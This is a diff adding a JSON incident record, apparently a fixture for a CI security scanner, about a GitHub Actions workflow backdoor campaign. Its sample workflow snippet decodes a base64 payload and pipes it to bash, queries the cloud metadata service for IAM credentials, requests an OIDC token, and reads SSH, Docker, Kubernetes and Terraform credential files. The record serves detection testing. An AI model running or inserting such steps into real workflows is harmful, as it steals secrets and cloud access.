@@ -1,0 +1,34 @@
+{
+  "schema_version": "ca9.incident.v1",
+  "id": "github-actions-workflow-backdoor-2026-05",
+  "title": "GitHub Actions workflow backdoor campaign",
+  "incident_date": "2026-05-18",
+  "source_urls": [
+    "https://www.stepsecurity.io/incidents"
+  ],
+  "threat_classes": [
+    "github-actions-workflow-backdoor",
+    "direct-poisoned-pipeline-execution",
+    "credential-theft",
+    "cloud-token-theft"
+  ],
+  "packages": [],
+  "advisories": [],
+  "workflow_patterns": [
+    {
+      "name": "encoded_payload_and_credential_harvest",
+      "workflow": "optimize-build.yml",
+      "snippet": "on:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n  id-token: write\n\njobs:\n  optimize:\n    steps:\n      - name: Optimize build cache\n        run: |\n          echo \"Y3VybCAtZnNTIGh0dHBzOi8vZXhhbXBsZS5jb20K\" | base64 -d | bash\n          curl -fsS http://169.254.169.254/latest/meta-data/iam/security-credentials/\n          curl -fsS \"$ACTIONS_ID_TOKEN_REQUEST_URL\" -H \"Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN\"\n          cat ~/.ssh/id_rsa ~/.docker/config.json ~/.kube/config .terraform.d/credentials.tfrc.json\n"
+    }
+  ],
+  "expected_current": {
+    "overall_status": "partial",
+    "inventory": "not_applicable",
+    "malware_advisory": "not_applicable",
+    "workflow": "pass"
+  },
+  "known_gaps": [
+    "ca9 can flag malicious workflow payload patterns, but cannot prove whether a compromised PAT or deploy key pushed directly to a protected branch.",
+    "Full prevention still requires branch rulesets, CODEOWNER review for workflow changes, token rotation, and GitHub audit-log monitoring."
+  ]
+}
